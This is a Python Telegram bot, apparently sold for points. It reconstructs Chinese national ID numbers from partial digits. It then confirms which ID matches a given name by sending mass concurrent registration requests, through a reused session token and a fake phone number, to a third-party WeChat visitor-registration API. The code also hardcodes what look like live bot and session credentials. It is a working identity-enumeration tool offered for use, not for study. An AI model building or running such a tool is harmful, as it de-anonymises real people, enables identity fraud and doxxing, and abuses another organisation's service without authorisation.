import telebot
import requests
import time
import re
import threading
import json
import os
import itertools
from concurrent.futures import ThreadPoolExecutor

# ================= 配置区 =================
API_TOKEN = '8417331227:AAESrsOPgEDMeu7NHgLMgoZrynkxoafBLBY'
ADMIN_ID = 6649617045 
POINTS_FILE = 'points.json'
TOKEN_FILE = 'token.txt'

# 默认 Token (如果文件不存在则使用这个)
DEFAULT_TOKEN = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJsaXVjYWkiLCJzdWIiOiJ3ZWNoYXQ6bzhiQ2w2MmtyUUVwRzZHTmlaaF9YczhrcHBXVSIsImF1ZCI6WyJjZGN5cHciXSwiZXhwIjoxNzcwMDYwNTkzLCJuYmYiOjE3NzAwNDk3OTMsImlhdCI6MTc3MDA0OTc5MywianRpIjoiZjZjZDUxOTQtMDIyZS00YWIxLWI1NzUtNmQyYTc0YWI1MTUwIiwidXNlcl90eXBlIjoid2VjaGF0LXZpcCIsInVzZXJfaWQiOjMwMDQ1OH0.E8QrvHjur1JZPh2K43_ppaMq6NxQWj2EcSTP3AfRnsQAlIvOJwHAOXmCrDOQMFIbsO6dPyAmTV3CznKPrUkIZQ"

# 初始化机器人
bot = telebot.TeleBot(API_TOKEN)
user_states = {}

# --- 数据持久化逻辑 ---
def load_data():
    # 加载积分
    pts = {}
    if os.path.exists(POINTS_FILE):
        try:
            with open(POINTS_FILE, 'r') as f:
                data = json.load(f)
                pts = {int(k): v for k, v in data.items()}
        except: pass
    
    # 加载 Token
    tk = DEFAULT_TOKEN
    if os.path.exists(TOKEN_FILE):
        try:
            with open(TOKEN_FILE, 'r') as f:
                tk = f.read().strip()
        except: pass
    return pts, tk

user_points, CURRENT_X_TOKEN = load_data()

def save_points():
    with open(POINTS_FILE, 'w') as f:
        json.dump(user_points, f)

def save_token(new_tk):
    with open(TOKEN_FILE, 'w') as f:
        f.write(new_tk)

# --- 身份证校验逻辑 ---
def is_valid_id(n):
    if len(n) != 18: return False
    try:
        year, month, day = int(n[6:10]), int(n[10:12]), int(n[12:14])
        if year > 2026 or year < 1950 or month > 12 or day > 31: return False
        var = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
        var_id = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
        checksum = sum(int(n[i]) * var[i] for i in range(17)) % 11
        return var_id[checksum] == n[17].upper()
    except: return False

# --- 核验任务 ---
def run_batch_task(chat_id, msg_id, name, id_list):
    global CURRENT_X_TOKEN
    headers = {"X-Token": CURRENT_X_TOKEN, "content-type": "application/json", "User-Agent": "Mozilla/5.0"}
    total, done, success_results = len(id_list), 0, []
    is_running = True

    def progress():
        nonlocal done, is_running
        last_p = -1
        while is_running:
            p = int(done/total*100) if total > 0 else 0
            if p != last_p:
                try: bot.edit_message_text(f"🔍 核验中: {p}% ({done}/{total})", chat_id, msg_id)
                except: pass
                last_p = p
            time.sleep(2)
    threading.Thread(target=progress, daemon=True).start()

    def verify(id_no):
        nonlocal done
        try:
            r = requests.post("https://wxxcx.cdcypw.cn/wechat/visitor/create", 
                              json={"id_type": "id_card", "mobile": "15555555555", "id_no": id_no, "name": name}, 
                              headers=headers, timeout=6)
            res = r.json()
            if res.get("code") == 0: success_results.append(f"`{name} {id_no}` ✅")
            elif res.get("code") == 401: return "STOP"
        except: pass
        finally: done += 1

    with ThreadPoolExecutor(max_workers=10) as ex:
        for r in ex.map(verify, id_list):
            if r == "STOP": 
                bot.send_message(chat_id, "🚨 Token 已失效，请联系管理员 @aaSm68 更新。")
                is_running = False
                return

    is_running = False
    if success_results: bot.send_message(chat_id, "\n".join(success_results), parse_mode='Markdown')
    else: bot.edit_message_text("❌ 核验完成，未发现匹配结果。", chat_id, msg_id)

# --- 指令处理 ---
@bot.message_handler(commands=['add'])
def add_points(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "🚫 权限拒绝，请联系管理员 @aaSm68")
        return
    try:
        _, tid, amt = message.text.split()
        user_points[int(tid)] = user_points.get(int(tid), 0) + int(amt)
        save_points()
        bot.reply_to(message, f"✅ 积分已更新！用户 `{tid}` 余额: `{user_points[int(tid)]}`", parse_mode='Markdown')
    except: bot.reply_to(message, "格式: `/add ID 分数`")

@bot.message_handler(commands=['set_token'])
def set_token_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "🚫 权限拒绝")
        return
    msg = bot.send_message(message.chat.id, "🗝 请发送新的 X-Token:")
    bot.register_next_step_handler(msg, update_token)

def update_token(m):
    global CURRENT_X_TOKEN
    CURRENT_X_TOKEN = m.text.strip()
    save_token(CURRENT_X_TOKEN) # 保存到文件，重启也不怕
    bot.send_message(m.chat.id, "✅ Token 已保存并实时生效！")

@bot.message_handler(commands=['start'])
def start_cmd(message):
    uid = message.from_user.id
    pts = user_points.get(uid, 0)
    bot.send_message(message.chat.id, f"👋 **核验模式**\n💰 积分: `{pts}`\n💸 费用: 100/次\n👤 管理员: @aaSm68\n\n请输入姓名:", parse_mode='Markdown')
    user_states[message.chat.id] = {'step': 'v_name'}

@bot.message_handler(commands=['gen'])
def gen_cmd(message):
    uid = message.from_user.id
    pts = user_points.get(uid, 0)
    bot.send_message(message.chat.id, f"🛠 **生成模式**\n💰 积分: `{pts}`\n💸 费用: 50/次\n\n请输入基础号(未知位用x):", parse_mode='Markdown')
    user_states[message.chat.id] = {'step': 'g_card'}

@bot.message_handler(func=lambda m: m.chat.id in user_states)
def handle_steps(message):
    state = user_states[message.chat.id]
    uid = message.from_user.id
    
    if state['step'] == 'v_name':
        user_states[message.chat.id].update({'step': 'v_ids', 'name': message.text.strip()})
        bot.send_message(message.chat.id, "请发送身份证号列表:")
    
    elif state['step'] == 'v_ids':
        if user_points.get(uid, 0) < 100:
            bot.reply_to(message, "❌ 积分不足(需100)，请联系 @aaSm68")
            return
        raw = re.findall(r'\d{17}[\dXx]', message.text)
        v_ids = [i for i in raw if is_valid_id(i)]
        if not v_ids: 
            bot.reply_to(message, "❌ 未发现有效身份证号。")
            return
        user_points[uid] -= 100
        save_points()
        msg = bot.send_message(message.chat.id, "⚙️ 扣除100积分，开始核验...")
        threading.Thread(target=run_batch_task, args=(message.chat.id, msg.message_id, state['name'], v_ids)).start()
        del user_states[message.chat.id]

    elif state['step'] == 'g_card':
        card = message.text.strip().lower()
        if len(card) != 18:
            bot.reply_to(message, "❌ 格式错误。")
            return
        user_states[message.chat.id].update({'step': 'g_sex', 'card': card})
        bot.send_message(message.chat.id, "请输入性别(男/女/未知):")

    elif state['step'] == 'g_sex':
        if user_points.get(uid, 0) < 50:
            bot.reply_to(message, "❌ 积分不足(需50)，请联系 @aaSm68")
            return
        
        sex_input, card = message.text.strip(), state['card']
        char_sets = [list(ch) if ch != 'x' else list("0123456789") for ch in card]
        if sex_input == "男": char_sets[16] = ["1", "3", "5", "7", "9"]
        elif sex_input == "女": char_sets[16] = ["0", "2", "4", "6", "8"]

        bot.send_message(message.chat.id, "⏳ 正在计算合法号码...")
        valid_list = []
        count = 0
        for res in itertools.product(*char_sets):
            num = "".join(res)
            if is_valid_id(num):
                valid_list.append(num)
                count += 1
            if count >= 100: break
        
        if valid_list:
            user_points[uid] -= 50
            save_points()
            bot.send_message(message.chat.id, f"✅ 生成成功(扣除50分):\n`" + "\n".join(valid_list) + "`", parse_mode='Markdown')
        else:
            bot.send_message(message.chat.id, "❌ 未能生成符合规则的号码。")
        del user_states[message.chat.id]

if __name__ == '__main__':
    print("--- 存档版综合机器人启动成功 ---")
    bot.infinity_polling()
